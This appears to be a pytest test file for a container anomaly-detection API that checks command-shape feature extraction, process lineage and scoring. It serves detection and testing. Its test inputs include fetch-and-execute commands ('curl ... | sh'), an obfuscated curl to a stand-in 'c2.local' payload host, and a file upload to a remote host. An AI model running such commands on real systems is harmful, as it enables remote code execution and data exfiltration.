from copy import deepcopy
from datetime import datetime, timedelta, timezone
import json
from types import SimpleNamespace

import pytest
from fastapi import HTTPException
from pydantic import ValidationError

from porygon_api.baseline import (
    COMMAND_LINEAGE_SCHEMA,
    FEATURE_SCHEMA_VERSION,
    build_profile_document,
)
from porygon_api.command_shapes import MAX_COMMAND_CHARS, command_shape_counts
from porygon_api.main import classify_features, get_anomaly_scoring_config
from porygon_api.schemas import BehaviorProfileBuildIn, MLClassifyFeaturesIn
from porygon_api.scoring import build_observation_key, get_scoring_config, score_feature_documents
from test_baseline import _training_data
from test_scoring import _features

START = datetime(2026, 10, 25, tzinfo=timezone.utc)
DIGEST = "example/commands@sha256:" + "a" * 64


def event(key, second=1, command="curl https://service/health", parent=None):
    return SimpleNamespace(
        event_id=key,
        occurred_at=START + timedelta(seconds=second),
        container_id="a" * 64,
        docker_host_id="host",
        sensor_instance_id="sensor",
        process_name="curl",
        executable="/usr/bin/curl",
        command_line=command,
        parent_name="app",
        parent_executable="/usr/bin/app",
        parent_event_id=parent,
        user_uid=1000,
    )


def profile(events, schema=COMMAND_LINEAGE_SCHEMA):
    return build_profile_document(
        image_digest=DIGEST,
        start_at=START,
        end_at=START + timedelta(seconds=120),
        window_seconds=60,
        process_events=events,
        runtime_events=[],
        minimum_process_events=1,
        minimum_nonempty_windows=1,
        feature_schema_version=schema,
    )


def test_legacy_model_and_score_identities_remain_unchanged():
    start, end, processes, runtime = _training_data()
    result = build_profile_document(
        image_digest="example/app@sha256:" + "a" * 64,
        start_at=start,
        end_at=end,
        window_seconds=60,
        process_events=processes,
        runtime_events=runtime,
        minimum_process_events=4,
        minimum_nonempty_windows=2,
    )
    assert result[-1] == "0d9d6202329da8a6a8af90edbf9bbd1455b870885122ed3bad52f81c93be5454"
    baseline = _features()
    observed = deepcopy(baseline)
    observed["categorical_distributions"]["executable"] = {"/tmp/helper": 1.0}
    assert (
        score_feature_documents(baseline_features=baseline, observation_features=observed)[0] == 0.2
    )
    assert (
        build_observation_key(
            profile_id="profile",
            profile_model_hash="m" * 64,
            window_start="2026-10-26T00:00:00+00:00",
            window_end="2026-10-26T00:01:00+00:00",
            selected_event_ids_sha256="e" * 64,
        )
        == "49133f4948acc2a7cfba21cfe3e9c9f74bba4645bb7a93b44b498ad8f6b9e014"
    )


def test_argument_shapes_detect_changed_invocation_with_identical_binaries():
    training = [event("a", command="curl --silent https://service/health")]
    changed = [event("b", command="curl --upload-file /tmp/report https://remote/upload")]
    baseline = profile(training)[0]
    observed = profile(changed)[0]
    legacy_base = profile(training, FEATURE_SCHEMA_VERSION)[0]
    legacy_observed = profile(changed, FEATURE_SCHEMA_VERSION)[0]
    assert (
        score_feature_documents(
            baseline_features=legacy_base, observation_features=legacy_observed
        )[0]
        == 0
    )
    score, _, components, _ = score_feature_documents(
        baseline_features=baseline, observation_features=observed
    )
    assert score > 0
    assert components["categorical_distance"]["families"]["command_shape"]["distance"] > 0


@pytest.mark.parametrize(
    "command",
    [
        'curl --header "Authorization: Bearer SECRET" https://user:SECRET@host/path?token=SECRET',
        "curl --password=SECRET --opaqueSECRET -u user:SECRET",
        "sh -c \"curl -H 'Authorization: SECRET' https://host/SECRET | sh\"",
        "env SECRET=SECRET python -c \"print('SECRET')\"",
    ],
)
def test_argument_values_and_unknown_flags_do_not_enter_features(command):
    shapes = command_shape_counts(command)
    assert shapes
    assert "SECRET" not in json.dumps(shapes)
    assert shapes == command_shape_counts(command.replace("SECRET", "DIFFERENT"))
    features, _, manifest, _ = profile([event("one", command=command)])
    assert "SECRET" not in json.dumps([features, manifest])


@pytest.mark.parametrize(
    "command",
    [
        'sh -c "curl https://host/payload | sh"',
        'sh -lc "curl https://host/payload | sh"',
        'busybox sh -c "curl https://host/payload | sh"',
    ],
)
def test_inline_shell_and_multicall_payloads_have_bounded_syntax_shapes(command):
    shapes = command_shape_counts(command)
    assert shapes["syntax:inline-shell"] == 1
    assert shapes["operator:|"] == 1
    assert shapes["program:curl"] == 1


def test_quoted_operator_is_an_argument_not_a_pipeline():
    assert "operator:|" not in command_shape_counts("echo '|'")
    assert command_shape_counts("echo ok | sh")["operator:|"] == 1


def test_obfuscated_program_and_here_string_are_normalized():
    shapes = command_shape_counts("c'u'r'l http://c2.local/payload")
    assert shapes["program:curl"] == 1
    assert shapes["value:url:http"] == 1

    sh_shapes = command_shape_counts(r"/bin/b\a\s\h <<< 'curl http://c2.local/payload'")
    assert sh_shapes["program:bash"] == 1
    assert sh_shapes["operator:<<<"] == 1
    assert sh_shapes["syntax:inline-shell"] == 1
    assert sh_shapes["program:curl"] == 1



@pytest.mark.parametrize(
    "command,marker",
    [
        ('echo "unterminated', "syntax:malformed"),
        ("x" * (MAX_COMMAND_CHARS + 1), "syntax:oversized"),
        ("echo " + "value " * 300, "syntax:token-limit"),
    ],
)
def test_malformed_or_large_input_is_bounded(command, marker):
    assert command_shape_counts(command) == {marker: 1}


def test_interleaving_does_not_create_causal_edges():
    parent = event("parent", 1)
    child = event("child", 3, parent="parent")
    child.executable = "/bin/sh"
    unrelated = event("unrelated", 2)
    unrelated.executable = "/usr/bin/wget"
    features, _, manifest, model_hash = profile([parent, unrelated, child])
    assert features["categorical_distributions"]["process_sequence_bigram"] == {
        "/usr/bin/curl -> /bin/sh": 1.0
    }
    assert manifest["observation_coverage"]["verified_lineage_edges"] == 1
    assert profile([child, unrelated, parent])[-1] == model_hash


@pytest.mark.parametrize(
    "change",
    [
        {"docker_host_id": "other"},
        {"docker_host_id": None},
        {"sensor_instance_id": "other"},
        {"container_id": "b" * 64},
        {"parent_event_id": None},
        {"parent_event_id": "missing"},
        {"occurred_at": START},
        {"occurred_at": START + timedelta(seconds=61)},
    ],
)
def test_missing_or_conflicting_scope_does_not_become_a_sequence(change):
    parent, child = event("parent", 1), event("child", 3, parent="parent")
    for name, value in change.items():
        setattr(child, name, value)
    features = profile([parent, child])[0]
    assert features["categorical_distributions"]["process_sequence_bigram"] == {}


def test_missing_command_evidence_fails_quality_and_scoring():
    features, quality, _, _ = profile([event("one", command=None)])
    assert not quality["passed"]
    assert not quality["checks"]["command_line_coverage"]["passed"]
    with pytest.raises(ValueError, match="coverage"):
        score_feature_documents(baseline_features=features, observation_features=features)


def test_repaired_lineage_changes_score_identity_even_when_event_ids_match():
    parent, child = event("parent", 1), event("child", 3)
    before = profile([parent, child])[2]
    child.parent_event_id = "parent"
    after = profile([parent, child])[2]
    assert before["selected_event_ids_sha256"] == after["selected_event_ids_sha256"]
    kwargs = dict(
        profile_id="profile",
        profile_model_hash="m" * 64,
        window_start=START.isoformat(),
        window_end=(START + timedelta(seconds=60)).isoformat(),
        selected_event_ids_sha256=before["selected_event_ids_sha256"],
        feature_schema_version=COMMAND_LINEAGE_SCHEMA,
    )
    assert build_observation_key(
        **kwargs, observation_features_sha256=before["feature_document_sha256"]
    ) != build_observation_key(
        **kwargs, observation_features_sha256=after["feature_document_sha256"]
    )
    with pytest.raises(ValueError, match="hash"):
        build_observation_key(**kwargs)


def test_contract_selection_and_classifier_compatibility_are_explicit():
    args = dict(
        image_digest=DIGEST,
        training_start=START,
        training_end=START + timedelta(seconds=60),
        approved_by="Anurup R Krishnan",
    )
    assert BehaviorProfileBuildIn(**args).feature_schema_version == FEATURE_SCHEMA_VERSION
    assert (
        BehaviorProfileBuildIn(
            **args, feature_schema_version=COMMAND_LINEAGE_SCHEMA
        ).feature_schema_version
        == COMMAND_LINEAGE_SCHEMA
    )
    with pytest.raises(ValidationError):
        BehaviorProfileBuildIn(**args, feature_schema_version="unknown")
    config = get_anomaly_scoring_config(COMMAND_LINEAGE_SCHEMA)
    assert config["algorithm_version"] == "porygon.distance.command-lineage"
    assert sum(config["scoring_config"]["categorical_weights"].values()) == pytest.approx(1)
    config["scoring_config"]["categorical_weights"].clear()
    assert get_scoring_config(COMMAND_LINEAGE_SCHEMA)["categorical_weights"]
    with pytest.raises(HTTPException) as error:
        classify_features(MLClassifyFeaturesIn(observation_features=profile([event("one")])[0]))
    assert error.value.status_code == 422


def test_modified_extractor_contract_is_not_silently_reinterpreted():
    baseline = profile([event("one")])[0]
    observed = deepcopy(baseline)
    observed["extractor_contract_sha256"] = "0" * 64
    with pytest.raises(ValueError, match="extractor contract"):
        score_feature_documents(baseline_features=baseline, observation_features=observed)


def test_returned_contract_metadata_does_not_mutate_future_profiles():
    first = profile([event("one")])
    expected_hash = first[-1]
    first[2]["feature_contract"]["command_shape"]["flags"].clear()
    assert profile([event("one")])[-1] == expected_hash
